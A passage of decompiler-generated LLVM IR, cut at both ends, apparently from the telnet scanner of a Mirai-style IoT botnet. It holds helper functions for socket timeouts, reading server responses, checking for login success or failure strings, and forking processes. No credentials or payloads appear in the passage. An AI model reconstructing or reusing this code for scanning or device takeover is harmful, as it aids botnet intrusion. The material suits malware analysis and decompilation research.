  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9668 = load i32, i32* @fp, align 4
  store i32 %v3_9668, i32* %stack_var_-16, align 4
  store i32 38512, i32* %stack_var_-4, align 4
  %v2_966c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_966c, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9690 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_96a4 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_96b8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96b8.lr.ph, %dec_label_pc_96b8
  %storemerge527 = phi i32 [ 0, %dec_label_pc_96b8.lr.ph ], [ %v1_96cc, %dec_label_pc_96b8 ]
  %v5_96c4 = mul nuw nsw i32 %storemerge527, 4
  %v6_96c4 = add i32 %v5_96c4, %v2_96a4
  %v7_96c4 = inttoptr i32 %v6_96c4 to i32*
  store i32 0, i32* %v7_96c4, align 4
  %v1_96cc = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_96cc, 32
  br i1 %tmp52, label %dec_label_pc_96b8, label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96b8
  %v13_9668 = ptrtoint i32* %stack_var_-16 to i32
  %v3_96e4 = udiv i32 %arg1, 32
  %v3_96f0 = mul nuw nsw i32 %v3_96e4, 4
  %v2_96f8 = add nsw i32 %v3_96f0, -160
  %v2_96fc = add i32 %v2_96f8, %v13_9668
  %v1_9700 = inttoptr i32 %v2_96fc to i32*
  %v2_9700 = load i32, i32* %v1_9700, align 4
  %v1_9708 = urem i32 %arg1, 32
  %v6_9710 = shl i32 1, %v1_9708
  %v2_9714 = or i32 %v2_9700, %v6_9710
  store i32 %v2_9714, i32* %v1_9700, align 4
  %v1_9734 = add i32 %arg1, 1
  %v2_9740 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9754 = call i32 @__libc_select(i32 %v1_9734, i32 %v2_96a4, i32 0, i32 %v2_96a4, i32 %v2_9740)
  %v5_9768 = icmp sgt i32 %v5_9754, 0
  br i1 %v5_9768, label %dec_label_pc_98fc.preheader, label %dec_label_pc_9868.preheader

dec_label_pc_9868.preheader:                      ; preds = %dec_label_pc_96e0
  %v7_987023 = icmp slt i32 %tmp33, 10
  br i1 %v7_987023, label %dec_label_pc_97a8.lr.ph, label %dec_label_pc_98fc.preheader

dec_label_pc_97a8.lr.ph:                          ; preds = %dec_label_pc_9868.preheader, %dec_label_pc_985c
  %stack_var_-44.024 = phi i32 [ %v1_9860, %dec_label_pc_985c ], [ %tmp33, %dec_label_pc_9868.preheader ]
  %v2_9774 = load i32, i32* @global_var_24170.48, align 4
  %v3_9780 = call i32 @Rootsprintf(i32 %v2_9774, i32 ptrtoint ([5 x i8]* @global_var_193d8.50 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_97a8

dec_label_pc_97a8:                                ; preds = %dec_label_pc_97a8.lr.ph, %dec_label_pc_97a8
  %storemerge615 = phi i32 [ 0, %dec_label_pc_97a8.lr.ph ], [ %v1_97bc, %dec_label_pc_97a8 ]
  %v5_97b4 = mul nuw nsw i32 %storemerge615, 4
  %v6_97b4 = add i32 %v5_97b4, %v2_96a4
  %v7_97b4 = inttoptr i32 %v6_97b4 to i32*
  store i32 0, i32* %v7_97b4, align 4
  %v1_97bc = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_97bc, 32
  br i1 %tmp53, label %dec_label_pc_97a8, label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_97a8
  %v2_97f0 = load i32, i32* %v1_9700, align 4
  %v2_9804 = or i32 %v2_97f0, %v6_9710
  store i32 %v2_9804, i32* %v1_9700, align 4
  store i32 0, i32* @r2, align 4
  %v5_9844 = call i32 @__libc_select(i32 %v1_9734, i32 %v2_96a4, i32 0, i32 %v2_96a4, i32 %v2_9740)
  %v5_9858 = icmp sgt i32 %v5_9844, 0
  br i1 %v5_9858, label %dec_label_pc_98fc.preheader, label %dec_label_pc_985c

dec_label_pc_985c:                                ; preds = %dec_label_pc_97d0
  %v1_9860 = add nsw i32 %stack_var_-44.024, 1
  %v7_9870 = icmp slt i32 %v1_9860, 10
  br i1 %v7_9870, label %dec_label_pc_97a8.lr.ph, label %dec_label_pc_98fc.preheader

dec_label_pc_98fc.preheader:                      ; preds = %dec_label_pc_985c, %dec_label_pc_97d0, %dec_label_pc_9868.preheader, %dec_label_pc_96e0
  %v5_98a4 = bitcast i8* %stack_var_-185 to i32*
  %not.v7_990457 = icmp sgt i32 %arg3, 1
  %v2_991c59 = icmp eq i1 %not.v7_990457, false
  br i1 %v2_991c59, label %dec_label_pc_9924, label %dec_label_pc_9888

dec_label_pc_9888:                                ; preds = %dec_label_pc_98fc.preheader, %dec_label_pc_98f0
  %v1_990062.in = phi i32 [ %v1_990062, %dec_label_pc_98f0 ], [ %arg3, %dec_label_pc_98fc.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_98e0, %dec_label_pc_98f0 ], [ %arg2, %dec_label_pc_98fc.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_98f4, %dec_label_pc_98f0 ], [ 0, %dec_label_pc_98fc.preheader ]
  %v1_990062 = add i32 %v1_990062.in, -1
  %v2_988c = load i32, i32* @global_var_24170.48, align 4
  %v6_98a4 = call i32 @__libc_recv(i32 %v2_988c, i32* %v5_98a4, i32 1, i32 0, i32 %v1_990062)
  %v7_98ac = icmp eq i32 %v6_98a4, 1
  br i1 %v7_98ac, label %dec_label_pc_98cc, label %dec_label_pc_98b4

dec_label_pc_98b4:                                ; preds = %dec_label_pc_9888
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9938

dec_label_pc_98cc:                                ; preds = %dec_label_pc_9888
  %v3_98cc = load i8, i8* %stack_var_-185, align 1
  %v4_98d0 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_98cc, i8* %stack_var_-40.061, align 1
  %v1_98dc = add i32 %v4_98d0, 1
  %v5_98e0 = inttoptr i32 %v1_98dc to i8*
  %v3_98e4 = load i8, i8* %stack_var_-185, align 1
  %v7_98e8 = icmp eq i8 %v3_98e4, 10
  br i1 %v7_98e8, label %dec_label_pc_9924, label %dec_label_pc_98f0

dec_label_pc_98f0:                                ; preds = %dec_label_pc_98cc
  %v1_98f4 = add i32 %stack_var_-36.060, 1
  %not.v7_9904 = icmp sgt i32 %v1_990062, 1
  %v2_991c = icmp eq i1 %not.v7_9904, false
  br i1 %v2_991c, label %dec_label_pc_9924, label %dec_label_pc_9888

dec_label_pc_9924:                                ; preds = %dec_label_pc_98cc, %dec_label_pc_98f0, %dec_label_pc_98fc.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_98fc.preheader ], [ %v1_98f4, %dec_label_pc_98f0 ], [ %stack_var_-36.060, %dec_label_pc_98cc ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_98fc.preheader ], [ %v5_98e0, %dec_label_pc_98f0 ], [ %v5_98e0, %dec_label_pc_98cc ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9938

dec_label_pc_9938:                                ; preds = %dec_label_pc_98b4, %dec_label_pc_9924
  %storemerge = phi i32 [ -1, %dec_label_pc_98b4 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9924 ]
  %v2_9944 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9944, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_990062, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9860, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_96a4, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9938, { 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9888, { 1, 0 }
  uselistorder label %dec_label_pc_97a8, { 1, 0 }
  uselistorder label %dec_label_pc_97a8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9954 = load i32, i32* @fp, align 4
  %v1_9968 = add i32 %arg1, 4
  %v2_9968 = inttoptr i32 %v1_9968 to i32*
  %v3_9968 = load i32, i32* %v2_9968, align 4
  store i32 %v3_9968, i32* @r0, align 4
  %v1_9974 = call i32 @__GI_inet_ntoa(i32 %v3_9968)
  store i32 %v3_9954, i32* @fp, align 4
  ret i32 %v1_9974
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_998c = load i32, i32* @fp, align 4
  store i32 39316, i32* %stack_var_-4, align 4
  %v2_9990 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9990, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_99b8 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_99cc = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_99dc = load i8, i8* %arg3, align 1
  %v2_99e0 = icmp eq i8 %v2_99dc, -1
  br i1 %v2_99e0, label %dec_label_pc_99e8, label %dec_label_pc_99f8

dec_label_pc_99e8:                                ; preds = %entry
  %v3_99dc = zext i8 %v2_99dc to i32
  %v6_99f4 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_99dc, i32 %v5_99cc)
  br label %dec_label_pc_99f8

dec_label_pc_99f8:                                ; preds = %entry, %dec_label_pc_99e8
  %v3_99fc = load i32, i32* %stack_var_0, align 4
  %v3_9a00 = call i32 @contains_string(i32 %tmp, i32 %v3_99fc)
  %v2_9a08 = icmp ne i32 %v3_9a00, 0
  %. = zext i1 %v2_9a08 to i32
  store i32 %v3_998c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_99dc, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_99f8, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a78.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a38 = load i32, i32* @fp, align 4
  store i32 %v3_9a38, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9a64 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9a78

dec_label_pc_9a78:                                ; preds = %dec_label_pc_9a78.lr.ph, %dec_label_pc_9a78
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9a78.lr.ph ], [ %v1_9a8c, %dec_label_pc_9a78 ]
  %v5_9a84 = mul nuw nsw i32 %storemerge25, 4
  %v6_9a84 = add i32 %v5_9a84, %v2_9a64
  %v7_9a84 = inttoptr i32 %v6_9a84 to i32*
  store i32 0, i32* %v7_9a84, align 4
  %v1_9a8c = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9a8c, 32
  br i1 %tmp21, label %dec_label_pc_9a78, label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9a78
  %v13_9a38 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9aa4 = udiv i32 %arg1, 32
  %v3_9ab0 = mul nuw nsw i32 %v3_9aa4, 4
  %v2_9ab8 = add nsw i32 %v3_9ab0, -136
  %v2_9abc = add i32 %v2_9ab8, %v13_9a38
  %v1_9ac0 = inttoptr i32 %v2_9abc to i32*
  %v2_9ac0 = load i32, i32* %v1_9ac0, align 4
  %v1_9ac8 = urem i32 %arg1, 32
  %v6_9ad0 = shl i32 1, %v1_9ac8
  %v2_9ad4 = or i32 %v2_9ac0, %v6_9ad0
  store i32 %v2_9ad4, i32* %v1_9ac0, align 4
  %v1_9af4 = add i32 %arg1, 1
  %v2_9afc = ptrtoint i32* %stack_var_-160 to i32
  %v5_9b10 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 0, i32 %v2_9afc)
  %v5_9b1c = icmp sgt i32 %v5_9b10, 0
  br i1 %v5_9b1c, label %dec_label_pc_9b2c, label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9aa0
  br label %dec_label_pc_9b4c

dec_label_pc_9b2c:                                ; preds = %dec_label_pc_9aa0
  %v5_9b40 = inttoptr i32 %arg3 to i32*
  %v6_9b40 = call i32 @__libc_recv(i32 %arg1, i32* %v5_9b40, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9b4c

dec_label_pc_9b4c:                                ; preds = %dec_label_pc_9b20, %dec_label_pc_9b2c
  %storemerge = phi i32 [ %v6_9b40, %dec_label_pc_9b2c ], [ 0, %dec_label_pc_9b20 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9a64, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9b4c, { 1, 0 }
  uselistorder label %dec_label_pc_9a78, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9b78 = icmp eq i32 %arg2, 0
  br i1 %v2_9b78, label %dec_label_pc_9b80, label %dec_label_pc_9b90

dec_label_pc_9b80:                                ; preds = %entry
  %v2_9b84 = load i32, i32* %arg1, align 4
  %v1_9b8c = call i32 @__libc_close(i32 %v2_9b84)
  br label %dec_label_pc_9b90

dec_label_pc_9b90:                                ; preds = %entry, %dec_label_pc_9b80
  %v2_9b98 = add i32 %tmp, 16
  %v3_9b98 = inttoptr i32 %v2_9b98 to i32*
  store i32 0, i32* %v3_9b98, align 4
  %v3_9b9c = load i32, i32* %stack_var_-24, align 4
  %v1_9ba8 = trunc i32 %v3_9b9c to i8
  %v3_9ba8 = add i32 %tmp, 8
  %v4_9ba8 = inttoptr i32 %v3_9ba8 to i8*
  store i8 %v1_9ba8, i8* %v4_9ba8, align 1
  %v1_9bb0 = add i32 %tmp, 24
  %v2_9bb0 = inttoptr i32 %v1_9bb0 to i32*
  %v3_9bb0 = load i32, i32* %v2_9bb0, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9bc0 = inttoptr i32 %v3_9bb0 to i8*
  %v3_9bc0 = call i32 @__GI_memset(i8* %v2_9bc0, i32 0)
  ret i32 %v3_9bc0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9b90, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9bd0 = load i32, i32* @fp, align 4
  %v2_9be8 = inttoptr i32 %arg1 to i32*
  %v3_9be8 = call i32 @advance_state(i32* %v2_9be8, i32 0)
  %v3_9bf4 = add i32 %arg1, 9
  %v4_9bf4 = inttoptr i32 %v3_9bf4 to i8*
  store i8 1, i8* %v4_9bf4, align 1
  store i32 %v3_9bd0, i32* @fp, align 4
  ret i32 %v3_9be8
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9c00 = load i32, i32* @fp, align 4
  %v3_9c18 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_23dac.55 to i32))
  store i32 %v3_9c00, i32* @fp, align 4
  ret i32 %v3_9c18
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9c30 = load i32, i32* @fp, align 4
  %v3_9c48 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_23d8c.64 to i32))
  store i32 %v3_9c30, i32* @fp, align 4
  ret i32 %v3_9c48

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40040, i32* %stack_var_-4, align 4
  %v2_9c64 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c64, i32* @fp, align 4
  %v1_9c74 = call i32 @contains_success(i32 %arg1)
  %v2_9c7c = icmp eq i32 %v1_9c74, 0
  br i1 %v2_9c7c, label %dec_label_pc_9c84, label %dec_label_pc_9cac

dec_label_pc_9c84:                                ; preds = %entry
  %v1_9c88 = call i32 @contains_fail(i32 %arg1)
  %v2_9c90 = icmp ne i32 %v1_9c88, 0
  %. = zext i1 %v2_9c90 to i32
  br label %dec_label_pc_9cac

dec_label_pc_9cac:                                ; preds = %dec_label_pc_9c84, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9c84 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_9cec

dec_label_pc_9cec:                                ; preds = %dec_label_pc_9cec, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_9cf0, %dec_label_pc_9cec ]
  %v1_9cf0 = add i32 %stack_var_-24.0, 1
  %v3_9cfc = mul i32 %v1_9cf0, 4
  %v2_9d08 = add i32 %v3_9cfc, %arg2
  %v1_9d0c = inttoptr i32 %v2_9d08 to i32*
  %v2_9d0c = load i32, i32* %v1_9d0c, align 4
  %v2_9d10 = icmp eq i32 %v2_9d0c, 0
  br i1 %v2_9d10, label %dec_label_pc_9d6c.preheader, label %dec_label_pc_9cec

dec_label_pc_9d6c.preheader:                      ; preds = %dec_label_pc_9cec
  %v3_9d44 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_9d6c

dec_label_pc_9d24:                                ; preds = %dec_label_pc_9d6c
  %v3_9d28 = mul i32 %storemerge2, 4
  %v2_9d34 = add i32 %v3_9d28, %arg2
  %v1_9d38 = inttoptr i32 %v2_9d34 to i32*
  %v2_9d38 = load i32, i32* %v1_9d38, align 4
  %v4_9d44 = call i32 @strcasestr(i8* %v3_9d44, i32 %v2_9d38, i32 %v3_9d28)
  %v2_9d4c = icmp eq i32 %v4_9d44, 0
  %v1_9d64 = add nuw i32 %storemerge2, 1
  br i1 %v2_9d4c, label %dec_label_pc_9d6c, label %dec_label_pc_9d84

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_9d24, %dec_label_pc_9d6c.preheader
  %storemerge2 = phi i32 [ %v1_9d64, %dec_label_pc_9d24 ], [ 0, %dec_label_pc_9d6c.preheader ]
  %v5_9d78 = icmp slt i32 %storemerge2, %v1_9cf0
  br i1 %v5_9d78, label %dec_label_pc_9d24, label %dec_label_pc_9d84

dec_label_pc_9d84:                                ; preds = %dec_label_pc_9d6c, %dec_label_pc_9d24
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9d24 ], [ 0, %dec_label_pc_9d6c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_9cf0, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d98 = load i32, i32* @fp, align 4
  store i32 %v3_9d98, i32* %stack_var_-16, align 4
  %v13_9d98 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9dc0 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9dd0 = or i32 %v2_9dc0, 2048
  store i32 %v1_9dd0, i32* @r2, align 4
  %v2_9de4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9e00 = urem i32 %arg3, 65536
  %v1_9e08 = call i32 @htons(i32 %v3_9e00)
  %v3_9e30 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9e38 = icmp eq i32 %v3_9e30, 0
  br i1 %v2_9e38, label %dec_label_pc_9e4c, label %dec_label_pc_9e40

dec_label_pc_9e40:                                ; preds = %entry
  br label %dec_label_pc_a004

dec_label_pc_9e4c:                                ; preds = %entry
  %v3_9e74 = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_9e74 = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_9e74, i32 16)
  %v1_9e84 = icmp slt i32 %v4_9e74, 0
  br i1 %v1_9e84, label %dec_label_pc_9e8c, label %dec_label_pc_9fc8

dec_label_pc_9e8c:                                ; preds = %dec_label_pc_9e4c
  %v0_9e8c = call i32 @__errno_location()
  %v1_9e94 = inttoptr i32 %v0_9e8c to i32*
  %v2_9e94 = load i32, i32* %v1_9e94, align 4
  %v7_9e98 = icmp eq i32 %v2_9e94, 115
  br i1 %v7_9e98, label %dec_label_pc_9ec4.lr.ph, label %dec_label_pc_9fbc

dec_label_pc_9ec4.lr.ph:                          ; preds = %dec_label_pc_9e8c
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9eb0 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9ec4

dec_label_pc_9ec4:                                ; preds = %dec_label_pc_9ec4.lr.ph, %dec_label_pc_9ec4
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9ec4.lr.ph ], [ %v1_9ed8, %dec_label_pc_9ec4 ]
  %v5_9ed0 = mul nuw nsw i32 %storemerge14, 4
  %v6_9ed0 = add i32 %v5_9ed0, %v2_9eb0
  %v7_9ed0 = inttoptr i32 %v6_9ed0 to i32*
  store i32 0, i32* %v7_9ed0, align 4
  %v1_9ed8 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_9ed8, 32
  br i1 %tmp32, label %dec_label_pc_9ec4, label %dec_label_pc_9eec

dec_label_pc_9eec:                                ; preds = %dec_label_pc_9ec4
  %v3_9ef0 = udiv i32 %arg1, 32
  %v3_9efc = mul nuw nsw i32 %v3_9ef0, 4
  %v2_9f04 = add nsw i32 %v3_9efc, -160
  %v2_9f08 = add i32 %v2_9f04, %v13_9d98
  %v1_9f0c = inttoptr i32 %v2_9f08 to i32*
  %v2_9f0c = load i32, i32* %v1_9f0c, align 4
  %v1_9f14 = urem i32 %arg1, 32
  %v6_9f1c = shl i32 1, %v1_9f14
  %v2_9f20 = or i32 %v2_9f0c, %v6_9f1c
  store i32 %v2_9f20, i32* %v1_9f0c, align 4
  %v1_9f40 = add i32 %arg1, 1
  %v2_9f48 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9f60 = call i32 @__libc_select(i32 %v1_9f40, i32 0, i32 %v2_9eb0, i32 0, i32 %v2_9f48)
  %tmp33 = icmp slt i32 %v5_9f60, 1
  br i1 %tmp33, label %dec_label_pc_9fb0, label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %dec_label_pc_9eec
  %v0_9f94 = call i32 @getsockopt()
  %v3_9f98 = load i32, i32* %stack_var_-192, align 4
  %v2_9f9c = icmp eq i32 %v3_9f98, 0
  br i1 %v2_9f9c, label %dec_label_pc_9fc8, label %dec_label_pc_9fa4

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f70
  br label %dec_label_pc_a004

dec_label_pc_9fb0:                                ; preds = %dec_label_pc_9eec
  br label %dec_label_pc_a004

dec_label_pc_9fbc:                                ; preds = %dec_label_pc_9e8c
  br label %dec_label_pc_a004

dec_label_pc_9fc8:                                ; preds = %dec_label_pc_9e4c, %dec_label_pc_9f70
  store i32 0, i32* @r2, align 4
  %v2_9fd4 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9fe4 = and i32 %v2_9fd4, -2049
  store i32 %v1_9fe4, i32* @r2, align 4
  %v2_9ff8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a004

dec_label_pc_a004:                                ; preds = %dec_label_pc_9fbc, %dec_label_pc_9fb0, %dec_label_pc_9fa4, %dec_label_pc_9e40, %dec_label_pc_9fc8
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9fb0 ], [ 1, %dec_label_pc_9fc8 ], [ 0, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9fbc ], [ 0, %dec_label_pc_9e40 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9eb0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_a004, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_9fc8, { 1, 0 }
  uselistorder label %dec_label_pc_9ec4, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_a014 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a014, i32* @ip, align 4
  %v3_a018 = load i32, i32* @r4, align 4
  %v6_a018 = load i32, i32* @r5, align 4
  %v9_a018 = load i32, i32* @r6, align 4
  %v0_a024 = call i32 @__libc_fork()
  %v2_a034 = icmp eq i32 %v0_a024, 0
  br i1 %v2_a034, label %dec_label_pc_a194, label %dec_label_pc_a048

dec_label_pc_a048:                                ; preds = %entry
  %v2_a04c = load i32, i32* @global_var_24178.66, align 4
  %v5_a04c = load i32, i32* @global_var_2417c.67, align 4
  %v2_a058 = add i32 %v2_a04c, 1
  %v3_a058 = icmp eq i32 %v2_a058, 0
  %v4_a05c = zext i1 %v3_a058 to i32
  %v5_a05c = add i32 %v4_a05c, %v5_a04c
  store i32 %v2_a058, i32* @global_var_24178.66, align 4
  store i32 %v5_a05c, i32* @global_var_2417c.67, align 4
  %v3_a070 = udiv i32 %v2_a058, 1073741824
  %v3_a074 = mul i32 %v5_a05c, 4
  %v2_a078 = or i32 %v3_a074, %v3_a070
  store i32 %v2_a078, i32* @r4, align 4
  %v3_a07c = mul i32 %v2_a058, 4
  %v1_a080 = add i32 %v3_a07c, 4
  %v1_a088 = call i32 @malloc(i32 %v1_a080)
  br label %dec_label_pc_a0e0

dec_label_pc_a0a0:                                ; preds = %dec_label_pc_a0e0, %dec_label_pc_a12c
  %v3_a0a4 = mul i32 %storemerge2, 4
  %v2_a0b0 = add i32 %v3_a0a4, %v1_a088
  %v2_a0c4 = load i32, i32* @global_var_2a3fc.69, align 4
  %v2_a0c8 = add i32 %v2_a0c4, %v3_a0a4
  %v1_a0cc = inttoptr i32 %v2_a0c8 to i32*
  %v2_a0cc = load i32, i32* %v1_a0cc, align 4
  %v2_a0d0 = inttoptr i32 %v2_a0b0 to i32*
  store i32 %v2_a0cc, i32* %v2_a0d0, align 4
  %v1_a0d8 = add i32 %storemerge2, 1
  br label %dec_label_pc_a0e0

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a048, %dec_label_pc_a0a0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a048 ], [ %v1_a0d8, %dec_label_pc_a0a0 ]
  %v2_a0f8 = load i32, i32* @global_var_24178.66, align 4
  %v5_a0f8 = load i32, i32* @global_var_2417c.67, align 4
  %v2_a10c = add i32 %v2_a0f8, -1
  %v3_a10c = icmp ne i32 %v2_a0f8, 0
  %v3_a110 = add i32 %v5_a0f8, -1
  %v5_a110 = sext i1 %v3_a10c to i32
  %v9_a124 = icmp eq i32 %v3_a110, %v5_a110
  br i1 %v9_a124, label %dec_label_pc_a12c, label %dec_label_pc_a0a0

dec_label_pc_a12c:                                ; preds = %dec_label_pc_a0e0
  store i32 %v2_a10c, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a10c, %storemerge2
  br i1 %tmp, label %dec_label_pc_a0a0, label %dec_label_pc_a14c

dec_label_pc_a14c:                                ; preds = %dec_label_pc_a12c
  store i32 %v5_a0f8, i32* @r4, align 4
  %v3_a154 = mul i32 %v2_a0f8, 4
  %v2_a160 = add i32 %v1_a088, -4
  %v1_a164 = add i32 %v2_a160, %v3_a154
  %v2_a16c = inttoptr i32 %v1_a164 to i32*
  store i32 %v0_a024, i32* %v2_a16c, align 4
  %v2_a174 = load i32, i32* @global_var_2a3fc.69, align 4
